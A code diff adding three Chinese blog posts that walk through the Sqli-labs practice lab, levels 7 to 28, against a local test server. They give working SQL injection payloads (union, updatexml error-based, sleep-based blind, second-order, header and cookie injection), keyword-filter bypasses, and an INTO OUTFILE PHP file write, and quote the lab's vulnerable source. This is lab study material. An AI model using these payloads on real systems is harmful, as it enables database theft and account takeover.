@@ -236,6 +236,942 @@
   
   
   <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/10/30/Sqli-labs Less23-28/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="P0rZ9">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="P0rZ9's blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2018/10/30/Sqli-labs Less23-28/" itemprop="url">Sqli-labs Less23-28</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-10-30T08:15:42+08:00">
+                2018-10-30
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <hr>
+<h3 id="less-23"><a href="#less-23" class="headerlink" title="less-23"></a>less-23</h3><pre><code>http://127.0.0.1:86/less-23/index.php?id=1&apos;  报错
+http://127.0.0.1:86/less-23/index.php?id=1&apos;%23    报错
+http://127.0.0.1:86/less-23/index.php?id=1&apos;--+ 报错
+http://127.0.0.1:86/less-23/index.php?id=1&apos;&apos; 正确
+</code></pre><p>猜想是后台过滤了这2种注释字符,但是我们可以用<code>&#39;1&#39;=&#39;1</code>闭合后面的<code>&#39;</code>。</p>
+<p>这里可利用联合注入,报错注入,延时注入,我们以联合注入为例:</p>
+<pre><code>http://127.0.0.1:86/less-23/index.php?id=-1&apos; union select 1,2,3 and &apos;1&apos;=&apos;1        
+</code></pre><p><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2018_10/2018-10-30.09.16.43-image.png" alt="2018-10-30.09.16.43-image.png"></p>
+<pre><code>http://127.0.0.1:86/less-23/index.php?id=-1&apos; union select 1,database(),3 and &apos;1&apos;=&apos;1
+</code></pre><p>然后将<code>database()</code>处更换为其他查询语句即可。<br>less-23过滤id的代码:</p>
+<pre><code>$reg = &quot;/#/&quot;;
+$reg1 = &quot;/--/&quot;;
+$replace = &quot;&quot;;
+$id = preg_replace($reg, $replace, $id);
+$id = preg_replace($reg1, $replace, $id);
+</code></pre><h3 id="less-24"><a href="#less-24" class="headerlink" title="less-24"></a>less-24</h3><p>这一关是关于二次注入的,二次注入也称为存储型的注入,就是将可能导致sql注入的字符先存储到数据库中,当再次调用这个恶意构造的字符时,就会触发sql注入。</p>
+<p>这个例子大致过程:注册一个含有恶意字符(构造sql语句)的用户名(<code>admin&#39;#</code>)—-&gt;存储到数据库中——&gt;修改密码时,调用恶意字符导致修改了用户admin的密码<br>n注册账户admin’#  密码:123456<br><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2018_10/2018-10-30.09.55.00-image.png" alt="2018-10-30.09.55.00-image.png"></p>
+<p>查看数据库:<br><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2018_10/2018-10-30.09.58.25-image.png" alt="2018-10-30.09.58.25-image.png"></p>
+<p>登陆后跳转到更改密码的页面,我们更改密码为test:<br><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2018_10/2018-10-30.09.59.01-image.png" alt="2018-10-30.09.59.01-image.png"></p>
+<p>查看数据库:<br><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2018_10/2018-10-30.09.59.57-image.png" alt="2018-10-30.09.59.57-image.png"></p>
+<p>我们发现我们刚才注册的账号<code>admin&#39;#</code>的密码并未改变,却改变了admin的密码<br>查看源码:</p>
+<pre><code>$curr_pass= mysql_real_escape_string($_POST[&apos;current_password&apos;]);
+$pass= mysql_real_escape_string($_POST[&apos;password&apos;]);
+$re_pass= mysql_real_escape_string($_POST[&apos;re_password&apos;]);
+
+if($pass==$re_pass)
+{    
+    $sql = &quot;UPDATE users SET PASSWORD=&apos;$pass&apos; where username=&apos;$username&apos; and password=&apos;$curr_pass&apos; &quot;;
+</code></pre><p>看代码我们就能理解了,刚才咱们提交修改<code>admin&#39;#</code>后,执行的sql语句是:</p>
+<pre><code>UPDATE users SET PASSWORD=&apos;test&apos; where username=&apos;admin&apos;#&apos; and password=&apos;123456&apos;
+</code></pre><p> 因为#注释掉了后面的内容,所以只执行了前面的语句,将admin的密码修改为test</p>
+<h3 id="less-25"><a href="#less-25" class="headerlink" title="less-25"></a>less-25</h3><p> 访问less-25的地址:<br> <img src="https://raw.githubusercontent.com/P0rZ9/img/master/2018_10/2018-10-30.10.53.14-image.png" alt="2018-10-30.10.53.14-image.png"></p>
+<p> 大概意思就是:and or被过滤,然后下面写出了过滤后的字符串。面对关键字被过滤的情况,我们可利用:</p>
+<pre><code>1.大小写绕过    AND AnD ANd And aNd aND anD Or oR OR等  
+2.双写绕过        anandd oorr
+3.编码绕过        hex urlencode
+4.特殊字符        an%00d o%00r
+5.利用符号绕过   and=&amp;&amp; or=||
+6.内联注释绕过  /*!and*/
+</code></pre><p>大小写不可以</p>
+<p>双写可以绕过:</p>
+<pre><code>http://127.0.0.1:86/less-25/index.php?id=1&apos; anandd &apos;1&apos;=&apos;1    
+</code></pre><p><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2018_10/2018-10-30.10.54.56-image.png" alt="2018-10-30.10.54.56-image.png"><br><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2018_10/2018-10-30.12.09.50-image.png" alt="2018-10-30.12.09.50-image.png"></p>
+<p>编码绕过:(绕不过)</p>
+<pre><code>%25%36%31%25%36%45%25%36%34
+http://127.0.0.1:86/less-25/index.php?id=1&apos; %25%36%31%25%36%45%25%36%34 &apos;1&apos;=&apos;1    
+</code></pre><p>插入%00绕过</p>
+<pre><code>http://127.0.0.1:86/less-25/index.php?id=1&apos; an%00d &apos;1&apos;=&apos;1
+</code></pre><p><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2018_10/2018-10-30.12.03.45-image.png" alt="2018-10-30.12.03.45-image.png"></p>
+<p>注:在数据库中 插入<code>/**/</code>也可绕过,但是在实际利用不可以  原因不详。。。。<br><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2018_10/2018-10-30.12.13.01-image.png" alt="2018-10-30.12.13.01-image.png"><br><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2018_10/2018-10-30.12.14.22-image.png" alt="2018-10-30.12.14.22-image.png"></p>
+<p>利用符号绕过:（&amp;&amp;会被url当成参数分隔符 <code>||</code>可利用）<br><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2018_10/2018-10-30.12.06.47-image.png" alt="2018-10-30.12.06.47-image.png"></p>
+<p>我们这里使用双写绕过方法进行演示,注入的方法可以为联合,报错与延时,这里以联合注入为例:</p>
+<pre><code>#显示报错位:
+http://127.0.0.1:86/less-25/index.php?id=-1&apos; union select 1,2,3 anandd &apos;1&apos;=&apos;1 
+
+#得到数据库名
+http://127.0.0.1:86/less-25/index.php?id=-1&apos; union select 1,database(),3 anandd &apos;1&apos;=&apos;1 
+</code></pre><p>接下来注入即可。</p>
+<p>less-25过滤<code>id</code>的代码:</p>
+<pre><code>function blacklist($id)
+{
+    $id= preg_replace(&apos;/or/i&apos;,&quot;&quot;, $id);            //strip out OR (non case sensitive)
+    $id= preg_replace(&apos;/AND/i&apos;,&quot;&quot;, $id);        //Strip out AND (non case sensitive)
+
+    return $id;
+}
+</code></pre><h3 id="less-25a"><a href="#less-25a" class="headerlink" title="less-25a"></a>less-25a</h3><p>与less-25类似,只是sql语句是直接拼接<code>$id</code>且关闭了报错,所以把闭合符号<code>&#39;</code>去掉用联合或者延时注入即可。</p>
+<hr>
+<h3 id="less-26"><a href="#less-26" class="headerlink" title="less-26"></a>less-26</h3><p>过滤函数:</p>
+<pre><code>function blacklist($id)
+{
+    $id= preg_replace(&apos;/or/i&apos;,&quot;&quot;, $id);            //strip out OR (non case sensitive)
+    $id= preg_replace(&apos;/and/i&apos;,&quot;&quot;, $id);        //Strip out AND (non case sensitive)
+    $id= preg_replace(&apos;/[\/\*]/&apos;,&quot;&quot;, $id);        //strip out /*
+    $id= preg_replace(&apos;/[--]/&apos;,&quot;&quot;, $id);        //Strip out --
+    $id= preg_replace(&apos;/[#]/&apos;,&quot;&quot;, $id);            //Strip out #
+    $id= preg_replace(&apos;/[\s]/&apos;,&quot;&quot;, $id);        //Strip out spaces
+    $id= preg_replace(&apos;/[\/\\\\]/&apos;,&quot;&quot;, $id);        //Strip out slashes
+    return $id;
+}
+</code></pre><p>过滤掉了<code>or and /* -- # 所有空白字符 \</code>等字符<br>对于or与and被过滤的处理方法,见less-25,对于注释符的过滤,见less-23,对于空格,可用下方的字符代替:</p>
+<pre><code>/**/   注释符   被过滤
+%09    TAB键（水平）
+%0a    新建一行
+%0b    TAB键（垂直）
+%0c    新的一页
+%0d    return功能
+%a0    空格
+</code></pre><p>可在<code>linux</code>下尝试是否能成功,这里没搭建,先占个坑</p>
+<h3 id="less-26a"><a href="#less-26a" class="headerlink" title="less-26a"></a>less-26a</h3><p>相比于less-26,闭合符换为了<code>&#39;)</code>且关闭了报错,使用联合或延时注入即可。</p>
+<h3 id="less-27"><a href="#less-27" class="headerlink" title="less-27"></a>less-27</h3><p>查看源代码：</p>
+<pre><code>function blacklist($id)
+{
+$id= preg_replace(&apos;/[\/\*]/&apos;,&quot;&quot;, $id);        //strip out /*
+$id= preg_replace(&apos;/[--]/&apos;,&quot;&quot;, $id);        //Strip out --.
+$id= preg_replace(&apos;/[#]/&apos;,&quot;&quot;, $id);            //Strip out #.
+$id= preg_replace(&apos;/[ +]/&apos;,&quot;&quot;, $id);        //Strip out spaces.
+$id= preg_replace(&apos;/select/m&apos;,&quot;&quot;, $id);        //Strip out spaces.
+$id= preg_replace(&apos;/[ +]/&apos;,&quot;&quot;, $id);        //Strip out spaces.
+$id= preg_replace(&apos;/union/s&apos;,&quot;&quot;, $id);        //Strip out union
+$id= preg_replace(&apos;/select/s&apos;,&quot;&quot;, $id);        //Strip out select
+$id= preg_replace(&apos;/UNION/s&apos;,&quot;&quot;, $id);        //Strip out UNION
+$id= preg_replace(&apos;/SELECT/s&apos;,&quot;&quot;, $id);        //Strip out SELECT
+$id= preg_replace(&apos;/Union/s&apos;,&quot;&quot;, $id);        //Strip out Union
+$id= preg_replace(&apos;/Select/s&apos;,&quot;&quot;, $id);        //Strip out Select
+return $id;
+}
+</code></pre><p>发现在前面的基础上过滤了<code>union select</code>等敏感字符,使用双写或大小写混淆即可绕过。</p>
+<h3 id="less-27a"><a href="#less-27a" class="headerlink" title="less-27a"></a>less-27a</h3><p>相比于less-27,直接拼接<code>$id</code>,所以不需要闭合符去闭合且关闭了报错,用联合或延时注入即可。</p>
+<h3 id="less-28"><a href="#less-28" class="headerlink" title="less-28"></a>less-28</h3><p>对比less-27,闭合符号由<code>&#39;</code>变为<code>&#39;）</code>且关闭报错与过滤条件少了select,使用联合或延时注入即可</p>
+<h3 id="less-28a"><a href="#less-28a" class="headerlink" title="less-28a"></a>less-28a</h3><p>对比less-28,只是少了几个过滤条件,使用联合或延时注入即可</p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/10/29/Sqli-labs Less17-22/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="P0rZ9">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="P0rZ9's blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2018/10/29/Sqli-labs Less17-22/" itemprop="url">Sqli-labs Less17-22</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-10-29T08:15:41+08:00">
+                2018-10-29
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <p>在做<code>less-17</code>之前,需要先了解一些MYSQL基础增删改查的命令:<a href="https://p0rz9.github.io/2018/10/12/mysql%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4/" target="_blank" rel="noopener">基础知识 | MYSQL基础命令</a></p>
+<h2 id="less-17-update注入"><a href="#less-17-update注入" class="headerlink" title="less-17 update注入"></a>less-17 update注入</h2><p>经测试在 admin字段中无报错信息<br>我们测试password字段:<br>uname=admin&amp;passwd=admin’&amp;submit=Submit<br><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2018_10/2018-10-29.11.59.10-image.png" alt="2018-10-29.11.59.10-image.png"></p>
+<p>查看报错即可知道这里用<code>&#39;</code>闭合即可,且这里显示出sql错误,所以可用报错注入或延时注入,下面介绍下报错注入:</p>
+<pre><code>uname=admin&amp;passwd=admin&apos; and updatexml(1,concat(0x7e,(select database()),0x7e),1)%23&amp;submit=Submit  #得到数据库名
+</code></pre><p>然后将select database()换为其他查询语句即可(可参考less-5的查询语句)：<br><a href="https://p0rz9.github.io/2018/10/23/Sqli-labs_Blind_injection_Less5-6/" target="_blank" rel="noopener">Sqli-labs_Blind_injection_Less5-6/</a></p>
+<p>less-17的sql语句为:</p>
+<pre><code>function check_input($value)
+{
+if(!empty($value))
+    {
+    // truncation (see comments)
+    $value = substr($value,0,15);
+    }
+
+    // Stripslashes if magic quotes enabled
+    if (get_magic_quotes_gpc())
+        {
+        $value = stripslashes($value);
+        }
+
+    // Quote if not a number
+    if (!ctype_digit($value))
+        {
+        $value = &quot;&apos;&quot; . mysql_real_escape_string($value) . &quot;&apos;&quot;;
+        }
+
+else
+    {
+    $value = intval($value);
+    }
+return $value;
+}
+......
+$update=&quot;UPDATE users SET password = &apos;$passwd&apos; WHERE username=&apos;$row1&apos;&quot;;
+</code></pre><p>查看源代码就可理解这里的<code>uname</code>字段为什么不能注入了,因为经过check_input安全函数过滤：</p>
+<pre><code>★addslashes() #预定字符之前添加反斜杠并返回
+注:PHP会默认(gpc为on状态)对所有的GET POST COOKIE数据自动运行addslashes,所以不应该对已转义过的字符使用addslashes()操作,会造成双层转义。
+遇到这种情况,一般使用get_magic_quotes_gpc()进行检测。
+
+★stripslashes() #删除由addslashes()添加的反斜杠
+
+★mysql_real_escape_string() #转义sql语句中使用的特殊字符`
+</code></pre><p>经过这几个函数处理,所以<code>uname</code>这个字段不能注入了。<br>那这里注入的语句使用的是update操作  我们在挖掘CMS的漏洞时,也可以将查询语句拼接到后面,然后再找一处查询该数据表内容的地方形成注入(update insert注入)</p>
+<hr>
+<p>在接下来的几关都属于HTTP头注入,我们需要先了解一下一些http基础:</p>
+<pre><code>Accept： 浏览器能够处理的内容类型
+Accept-Charset： 浏览器能够显示的字符集
+Accept-Encoding：浏览器能够处理的压缩编码。
+Accept-Language： 浏览器当前设置的语言。
+Connection：浏览器与服务器之间连接的类型
+Cookie：当前页面设置的任何Cookie
+Host：发出请求的页面所在的域。
+Referer：发出请求的页面的URI。
+User-Agent：浏览器的用户代理字符串
+Server: WEB 服务器表明自己是什么软件及版本等信息。例如：Server：Apache/2.0.61 (Unix)
+</code></pre><h2 id="less-18-UA头注入"><a href="#less-18-UA头注入" class="headerlink" title="less-18 UA头注入"></a>less-18 UA头注入</h2><p>输入正确的账号密码:admin 0<br><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2018_10/2018-10-29.15.31.25-image.png" alt="2018-10-29.15.31.25-image.png"></p>
+<p>看见这里会显示ip与UA头,我们尝试注入:</p>
+<pre><code>User-Agent: aaaaa&apos; and updatexml(1,concat(0x7e,(select user()),0x7e),1),&apos;
+</code></pre><p><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2018_10/2018-10-29.15.22.23-image.png" alt="2018-10-29.15.22.23-image.png"></p>
+<p>ip伪造主要有几个参数:<br><code>X-FORWARDED-FOR</code> 是代理服务器通过<code>HTTP Headers</code>提供的客户端IP.代理服务器可以伪造任何IP.<br><code>$_SERVER[&#39;REMOTE_ADDR&#39;]</code> 就是跟你服务器直接连接的IP. 不可伪造<br><code>CLIENT_IP</code> 可伪造</p>
+<p>这里尝试了几个,ip不可伪造注入</p>
+<p>less-18的sql语句为:</p>
+<pre><code>$insert=&quot;INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES (&apos;$uagent&apos;, &apos;$IP&apos;, $uname)&quot;;
+</code></pre><h2 id="less-19-REFERER注入"><a href="#less-19-REFERER注入" class="headerlink" title="less-19 REFERER注入"></a>less-19 REFERER注入</h2><p><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2018_10/2018-10-29.15.46.12-image.png" alt="2018-10-29.15.46.12-image.png"><br>放入burp的reperter模块测试:<br>与less-18的payload一样,只不过是从UA头换到了referer处：</p>
+<pre><code>Referer: &apos; and updatexml(1,concat(0x7e,(select user()),0x7e),1),&apos;
+</code></pre><p><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2018_10/2018-10-29.16.32.48-image.png" alt="2018-10-29.16.32.48-image.png"></p>
+<p>然后将<code>select user()</code>处更换为其他查询语句就ok了</p>
+<p>less-19的sql语句为:</p>
+<pre><code>$uname = check_input($_POST[&apos;uname&apos;]);
+$passwd = check_input($_POST[&apos;passwd&apos;]);
+......
+$insert=&quot;INSERT INTO `security`.`referers` (`referer`, `ip_address`) VALUES (&apos;$uagent&apos;, &apos;$IP&apos;)&quot;;
+</code></pre><h2 id="less-20-Cookie注入"><a href="#less-20-Cookie注入" class="headerlink" title="less-20 Cookie注入"></a>less-20 Cookie注入</h2><p>我们查看代码:</p>
+<pre><code>&lt;?php
+if(!isset($_COOKIE[&apos;uname&apos;]))
+    {
+    ...
+        $sql=&quot;SELECT  users.username, users.password FROM users WHERE users.username=$uname and users.password=$passwd ORDER BY users.id DESC LIMIT 0,1&quot;;
+        $result1 = mysql_query($sql);
+        $row1 = mysql_fetch_array($result1);
+        $cookee = $row1[&apos;username&apos;];
+            if($row1)
+                {
+                echo &apos;&lt;font color= &quot;#FFFF00&quot; font size = 3 &gt;&apos;;
+                setcookie(&apos;uname&apos;, $cookee, time()+3600);    
+                ...
+}
+else
+{
+    if(!isset($_POST[&apos;submit&apos;]))
+        {
+            $cookee = $_COOKIE[&apos;uname&apos;];
+            ...
+            $sql=&quot;SELECT * FROM users WHERE username=&apos;$cookee&apos; LIMIT 0,1&quot;;
+            ...
+        }    
+    else
+        ...
+}
+?&gt;
+</code></pre><p>从源代码可看出,我在第一次登陆时,我们的cookie从username取值,当再次刷新后,会从cookie字段中读取username的值然后进行查询.</p>
+<p>首先填写正确账号密码:<br><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2018_10/2018-10-29.17.36.27-image.png" alt="2018-10-29.17.36.27-image.png"><br>提交之后:<br><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2018_10/2018-10-29.17.36.55-image.png" alt="2018-10-29.17.36.55-image.png"></p>
+<p>然后我们刷新时抓包:</p>
+<pre><code>GET /less-20/index.php HTTP/1.1
+Host: 127.0.0.1:86
+User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate
+DNT: 1
+Referer: http://127.0.0.1:86/less-20/index.php
+Cookie: uname=admin
+Connection: close
+Cache-Control: max-age=0
+</code></pre><p>修改cookie为：</p>
+<pre><code>Cookie: uname=admin&apos; and updatexml(1,concat(0x7e,(select user()),0x7e),1)%23
+</code></pre><p><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2018_10/2018-10-29.17.40.44-image.png" alt="2018-10-29.17.40.44-image.png"></p>
+<p>之后将<code>select user()</code>改为其他查询语句即可。</p>
+<h2 id="less-21-cookie-base64-注入"><a href="#less-21-cookie-base64-注入" class="headerlink" title="less-21 cookie_base64 注入"></a>less-21 cookie_base64 注入</h2><p>与less-20同理,只是将payload的闭合符号<code>&#39;</code>换为<code>&#39;)</code>,再用base64加密一下即可:<br><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2018_10/2018-10-29.17.50.13-image.png" alt="2018-10-29.17.50.13-image.png"></p>
+<h2 id="less-22"><a href="#less-22" class="headerlink" title="less-22"></a>less-22</h2><p>将less-21的payload的闭合符号<code>&#39;)</code>换为<code>&quot;</code>,再用base64加密一下即可:</p>
+<p><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2018_10/2018-10-29.18.01.40-image.png" alt="2018-10-29.18.01.40-image.png"></p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/10/28/Sqli-labs Less7-16/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="P0rZ9">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="P0rZ9's blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2018/10/28/Sqli-labs Less7-16/" itemprop="url">Sqli-labs Less7-16</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-10-28T08:15:41+08:00">
+                2018-10-28
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <blockquote>
+<p>这里笔者是从测试的角度来练习的,通过fuzz猜测闭合符号—&gt;猜测sql语句—&gt;注入利用</p>
+</blockquote>
+<h2 id="less-7"><a href="#less-7" class="headerlink" title="less-7:"></a>less-7:</h2><p>访问第7关地址:<br>按照笔者的理解,sql注入的第一步是去想办法闭合语句,我们在平常挖洞的时候测试sql注入时,碰到<code>http://127.0.0.1:86/less-7/index.php?id=1</code>我们往往会加’测试,但是并不是所有的代码都会用单引号去包裹,我们需要更全面的去fuzz</p>
+<p>这是我测试闭合符号的payload:<br>以less-7为例子:</p>
+<pre><code>http://127.0.0.1:86/less-7/index.php?id=1    正确
+http://127.0.0.1:86/less-7/index.php?id=1%23 正确
+</code></pre><hr>
+<p>fuzz的结果:</p>
+<table>
+<thead>
+<tr>
+<th>paylaod</th>
+<th style="text-align:right">未加%23(#)</th>
+<th style="text-align:right">加注释符(#)</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>id=1</td>
+<td style="text-align:right">正确</td>
+<td style="text-align:right">正确</td>
+</tr>
+<tr>
+<td>id=1’</td>
+<td style="text-align:right">错误</td>
+<td style="text-align:right">错误</td>
+</tr>
+<tr>
+<td>id=1’)</td>
+<td style="text-align:right">错误</td>
+<td style="text-align:right">错误</td>
+</tr>
+<tr>
+<td>id=1’))</td>
+<td style="text-align:right">错误</td>
+<td style="text-align:right">正确</td>
+</tr>
+<tr>
+<td>id=1”</td>
+<td style="text-align:right">正确</td>
+<td style="text-align:right">正确</td>
+</tr>
+<tr>
+<td>id=1”)</td>
+<td style="text-align:right">正确</td>
+<td style="text-align:right">正确</td>
+</tr>
+<tr>
+<td>id=1”))</td>
+<td style="text-align:right">正确</td>
+<td style="text-align:right">正确</td>
+</tr>
+<tr>
+<td>id=1)</td>
+<td style="text-align:right">正确</td>
+<td style="text-align:right">正确</td>
+</tr>
+<tr>
+<td>id=1))</td>
+<td style="text-align:right">正确</td>
+<td style="text-align:right">正确</td>
+</tr>
+</tbody>
+</table>
+<blockquote>
+<p>如果未加<code>%23(#)</code>显示错误而加上<code>%23(#)</code>显示正确即为闭合符号</p>
+</blockquote>
+<p>我们可看到加上<code>&#39;))</code>这3个字符去访问返回错误,但是在加上注释符(#)去访问就变回正常的了<br>所以我们就可以知道用<code>&#39;))</code>去闭合是正确的,当然这里为了更快速的测试,我把这些放入一个字典当中,用burp的intruder模块去爆破也是可以的:<br><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2018_10/2018-10-29.12.10.46-image.png" alt="2018-10-29.12.10.46-image.png"><br>根据结果也可判断出<code>&#39;))</code>去闭合是正确的,接下来就是去正常的注入即可:</p>
+<p>判断字段个数</p>
+<pre><code>http://127.0.0.1:86/less-7/index.php?id=1&apos;)) order by 3%23
+http://127.0.0.1:86/less-7/index.php?id=1&apos;)) order by 4%23
+</code></pre><p>得到字段数为3,<br>使用<code>out_file</code>写入文件:</p>
+<pre><code>http://127.0.0.1:86/less-7/index.php?id=1&apos;)) union select 1,&apos;&lt;?php phpinfo();?&gt;&apos;,3 into outfile &apos;C:/web/WWW/sqli-labs-master/Less-7/shell.php&apos;%23
+</code></pre><p>成功写入:<br><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2018_10/2018-10-28.17.28.55-image.png" alt="2018-10-28.17.28.55-image.png"></p>
+<p>less-7的sql语句为:</p>
+<pre><code>$sql=&quot;SELECT * FROM users WHERE id=((&apos;$id&apos;)) LIMIT 0,1&quot;;
+</code></pre><h2 id="less-8"><a href="#less-8" class="headerlink" title="less-8:"></a>less-8:</h2><p>我们先利用上面的方法得到正确的闭合符号:<br><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2018_10/2018-10-28.18.25.31-image.png" alt="2018-10-28.18.25.31-image.png"></p>
+<p>是个<code>&#39;</code>闭合无疑了</p>
+<p>因为这里正确页面包含<code>you are in</code> 错误页面无此字符串且没显示错误信息,那么这里我们只能使用盲注来获取信息,可参考笔者之前的文章:<br><a href="https://p0rz9.github.io/2018/10/23/Sqli-labs_Blind_injection_Less5-6/" target="_blank" rel="noopener">Sqli-labs_Blind_injection_Less5-6</a> </p>
+<p>less-8的sql语句为:</p>
+<pre><code>$sql=&quot;SELECT * FROM users WHERE id=&apos;$id&apos; LIMIT 0,1&quot;;
+</code></pre><h2 id="less-9"><a href="#less-9" class="headerlink" title="less-9:"></a>less-9:</h2><p>我们先利用上面的方法得到正确的闭合符号:<br><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2018_10/2018-10-28.18.09.07-image.png" alt="2018-10-28.18.09.07-image.png"><br>同样为<code>&#39;</code><br>这里同样没有返回错误信息,再结合less-9的题目:<code>Blind-Time based</code>,我们可知道这里是要使用延时注入的,贴几条payload:</p>
+<pre><code>?id=1&apos; and if((length(user())=14),sleep(5),1)%23 #当前用户长度为14
+?id=1&apos; and if((ascii(substr((select database()),1,1))=115)),sleep(3),1)%23   #数据库第一位是s(ascii码为115)
+?id=1&apos; and if((ascii(substr((select database()),1,1))=115)),sleep(3),1)%23   #数据库第一位是s(ascii码为115)
+</code></pre><p>……..<br>猜解表与字段同理。</p>
+<p><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2018_10/2018-10-28.18.42.48-image.png" alt="2018-10-28.18.42.48-image.png"><br><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2018_10/2018-10-28.18.42.10-image.png" alt="2018-10-28.18.42.10-image.png"></p>
+<p>less-9的sql语句为:</p>
+<pre><code>$sql=&quot;SELECT * FROM users WHERE id=&apos;$id&apos; LIMIT 0,1&quot;;
+</code></pre><h2 id="less-10"><a href="#less-10" class="headerlink" title="less-10:"></a>less-10:</h2><p>我们先利用上面的方法得到正确的闭合符号:<br><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2018_10/2018-10-28.18.50.58-image.png" alt="xxxxx"></p>
+<p><code>&quot;</code>闭合即可</p>
+<p>与less-9同理,只需把payload的闭合符变为<code>&quot;</code>即可</p>
+<p>less-10的sql语句为:</p>
+<pre><code>$id = &apos;&quot;&apos;.$id.&apos;&quot;&apos;;
+$sql=&quot;SELECT * FROM users WHERE id=$id LIMIT 0,1&quot;;
